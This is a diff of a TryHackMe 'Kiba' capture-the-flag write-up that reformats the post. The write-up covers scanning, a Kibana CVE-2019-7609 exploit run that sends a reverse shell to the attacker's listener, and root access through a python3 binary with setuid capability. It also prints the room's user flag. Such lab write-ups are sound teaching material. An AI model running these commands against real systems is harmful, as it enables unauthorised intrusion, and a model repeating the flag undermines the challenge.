@@ -6,16 +6,15 @@ categories:
   - TryHackMe
 ---
 
-<img src="kiba.png" alt="kiba">
+{{ <post-img src="kiba.png" alt="kiba" style="width: 200px;" > }}
 
 ## Enumeration
 
-### nmap
 
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdVrdscXW6Eaq1+q+MgEBuU8ngjH5elzu6EOX2UJzNKcvAgxLrV0gCtWb4dJiJ2TyCLmA5lr0+8/TCInbcNfvXbmMEjxv0H3mi4Wjc/6wLECBXmEBvPX/SUyxPQb9YusTj70qGxgyI6SCB13TKftGeHOn2YRGLkudRF5ptIWYZqRnwlmYDWvuEBotWyUpfC1fGEnk7iH6gr3XJ8pwhY8wOojWaXEPsSZux3iBO52GuHILC14OiR/rQz9jxsq4brm6Zk/RhPCt1Ct/5ytsPzmUi7Nvwz6UoR6AeSRSHxOCnNBRQc2+5tFY7JMBBtvOFtbASOleILHkmTJBuRK3jth5D
 |   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
@@ -25,7 +24,7 @@ PORT   STATE SERVICE REASON  VERSION
 
 80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
 |_http-title: Site doesn't have a title (text/html).
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
@@ -33,10 +32,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 5044/tcp open  lxi-evntsvc? syn-ack
 
 5601/tcp open  esmagent?    syn-ack
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
 |     HTTP/1.1 400 Bad Request
-|   FourOhFourRequest: 
+|   FourOhFourRequest:
 |     HTTP/1.1 404 Not Found
 |     kbn-name: kibana
 |     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
@@ -46,7 +45,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 |     connection: close
 |     Date: Wed, 23 Feb 2022 19:50:56 GMT
 |     {"statusCode":404,"error":"Not Found","message":"Not Found"}
-|   GetRequest: 
+|   GetRequest:
 |     HTTP/1.1 302 Found
 |     location: /app/kibana
 |     kbn-name: kibana
@@ -55,7 +54,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 |     content-length: 0
 |     connection: close
 |     Date: Wed, 23 Feb 2022 19:50:51 GMT
-|   HTTPOptions: 
+|   HTTPOptions:
 |     HTTP/1.1 404 Not Found
 |     kbn-name: kibana
 |     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
@@ -98,24 +97,19 @@ SF:indReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOptions,1C
 SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
 
 ```
-### gobuster
 
-```
+```bash
 /.hta                 (Status: 403) [Size: 277]
 /.htaccess            (Status: 403) [Size: 277]
 /.htpasswd            (Status: 403) [Size: 277]
 /index.html           (Status: 200) [Size: 1291]
-/server-status        (Status: 403) [Size: 277] 
-
+/server-status        (Status: 403) [Size: 277]
 ```
+
 Seems like there will be `prototype pollution` involved?
-
 The website says `Welcome, "linux capabilities" is very interesting.`
-
-After some google we discover it's something that can be used to leverage priviledges
-
+After some google we discover it's something that can be used to leverage privileges
 We move to the `kibana` app on port `5601` next
-
 The version number can be found in `management` section
 
 using Google for the cve and exploit I found [this article](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
@@ -124,13 +118,13 @@ Understand and follow the steps to get access
 
 Or just use the [script](https://github.com/LandGrey/CVE-2019-7609/)
 
-```
-└──╼ $python2 exploit.py -u http://10.10.99.205:5601 -host 10.8.226.203 -port 4444 --shell 
+```bash
+└──╼ $python2 exploit.py -u http://10.10.99.205:5601 -host 10.8.226.203 -port 4444 --shell
 [+] http://10.10.99.205:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
 [+] reverse shell completely! please check session on: 10.8.226.203:4444
 ```
 
-```
+```bash
 └──╼ $nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 50330
@@ -147,7 +141,7 @@ kibana-plugin
 ```
 Get user flag
 
-```
+```bash
 kiba@ubuntu:/home/kiba/kibana/bin$ cd ../../
 cd ../../
 kiba@ubuntu:/home/kiba$ ls -al
@@ -171,7 +165,6 @@ kiba@ubuntu:/home/kiba$ cat user.txt
 cat user.txt
 THM{k1bana_rc3_f0r_pr0s}
 
-
 ```
 
 ## Privilege escalation
@@ -180,7 +173,7 @@ Ok now we are back to `linux capabilities`
 
 use google! and read some [articles](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)
 
-```
+```bash
 kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
 getcap -r / 2>/dev/null
 /home/kiba/.hackmeplease/python3 = cap_setuid+ep
@@ -194,15 +187,15 @@ python3 would be my first choice
 
 wait! GTFObins have exploits for "capabilities" too!
 
-```
+```bash
 kiba@ubuntu:/home/kiba$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-<on3 -c 'import os; os.setuid(0); os.system("/bin/sh")'                      
+<on3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 id
 uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
 ```
 Cool! now let's get rewarded
 
-```
+```bash
 cd /root
 ls
 root.txt
